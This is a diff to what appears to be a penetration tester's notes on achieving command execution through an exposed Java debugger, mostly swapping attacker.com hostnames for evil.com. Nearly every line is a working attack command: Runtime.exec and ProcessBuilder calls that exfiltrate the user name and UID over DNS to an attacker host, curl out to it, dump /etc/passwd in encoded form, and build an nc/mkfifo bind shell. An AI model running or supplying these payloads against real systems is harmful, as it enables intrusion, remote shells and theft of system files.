@@ -107,21 +107,20 @@ main[1] print new java.lang.String("Blah").length()
 main[1] print java.lang.System.getProperty("user.name")
  java.lang.System.getProperty("user.name") = "Administrator"
 
-print new java.lang.Runtime().exec("dig hello.d2t.attacker.com")
-print new java.lang.Runtime().exec("curl http://attacker.com/hello")
+print new java.lang.Runtime().exec("dig evil.com")
+print new java.lang.Runtime().exec("curl http://evil.com/hello")
 
 - ProcessBuilder may not be listed in classes, but try use it anyway
 - ProcessBuilder may not be available if not loaded by the JVM, I would get error "No class named: java.lang.ProcessBuilder" (ie. nobody does import java.lang.ProcessBuilder).
 - java.util.Arrays.asList might not be avail depending on java version, use "".split("_") instead
-print new java.lang.ProcessBuilder(java.util.Arrays.asList("/bin/sh", "-c", "dig yes.d2t.attacker.com")).start() OK
-print new java.lang.ProcessBuilder(java.util.Arrays.asList("/bin/sh", "-c", "dig $USER.asdf.d2t.attacker.com")).start() OK fmserver
-print new java.lang.ProcessBuilder(java.util.Arrays.asList("/bin/sh", "-c", "dig uid$UID.asdf.d2t.attacker.com")).start() OK 502
+print new java.lang.ProcessBuilder(java.util.Arrays.asList("/bin/sh", "-c", "dig evil.com")).start() OK
+print new java.lang.ProcessBuilder(java.util.Arrays.asList("/bin/sh", "-c", "dig $USER.evil.com")).start() OK fmserver
+print new java.lang.ProcessBuilder(java.util.Arrays.asList("/bin/sh", "-c", "dig uid$UID.evil.com")).start() OK 502
 print new java.lang.ProcessBuilder(java.util.Arrays.asList("/bin/sh", "-c", "nc -vlnp 3999 < /tmp/.f|/bin/sh > /tmp/.f 2>&1")).start()
 
 - inband
 print new java.io.BufferedReader(new java.io.InputStreamReader(new java.lang.ProcessBuilder(java.util.Arrays.asList("bash","-c","cat /etc/passwd|tr \\n @")).start().getInputStream(),"UTF-8"),1000000).readLine()
 print new java.io.BufferedReader(new java.io.InputStreamReader(new java.lang.ProcessBuilder(java.util.Arrays.asList("bash","-c","cat /etc/passwd|gzip -f|base64 -w0")).start().getInputStream())).readLine()
-openssl base64
 
 - bind shell
 print new java.io.BufferedReader(new java.io.InputStreamReader(new java.lang.ProcessBuilder(java.util.Arrays.asList("bash","-c","mkfifo /tmp/.f")).start().getInputStream())).readLine()
@@ -134,13 +133,13 @@ print new java.lang.ProcessBuilder(java.util.Arrays.asList("/bin/sh", "-c", "tel
 - Runtime instead of ProcessBuilder 
 print new java.io.BufferedReader(new java.io.InputStreamReader(java.lang.Runtime.getRuntime().exec("cat /etc/passwd").getInputStream())).readLine()
 print new java.io.BufferedReader(new java.io.InputStreamReader(java.lang.Runtime.getRuntime().exec("cat /etc/passwd").getInputStream())).skip(32).readLine()
-print new java.io.BufferedReader(new java.io.InputStreamReader(java.lang.Runtime.getRuntime().exec("bashXX-cXXuname -a 2>&1".split("XX")).getInputStream())).readLine()
+print new java.io.BufferedReader(new java.io.InputStreamReader(java.lang.Runtime.getRuntime().exec("bash_-c_uname -a 2>&1".split("_")).getInputStream())).readLine()
 
 print new java.lang.Runtime().exec("bash -c id>/tmp/id.txt")
 print new java.lang.Runtime.getRuntime().exec("bash_-c_uname -a>/tmp/uname.txt".split("_"))
 print new java.io.BufferedReader(new java.io.FileReader("/tmp/uname.txt")).readLine()
 
-print new java.io.FileWriter("/tmp/b.txt").append("asdf asdfasdfasdf asdf@asdf").flush()
+print new java.io.FileWriter("/tmp/f.txt").append("blah").flush()
 
 # dymanic code execution using class loader
 http://www.hsc-news.com/archives/2010/000074.html LSV
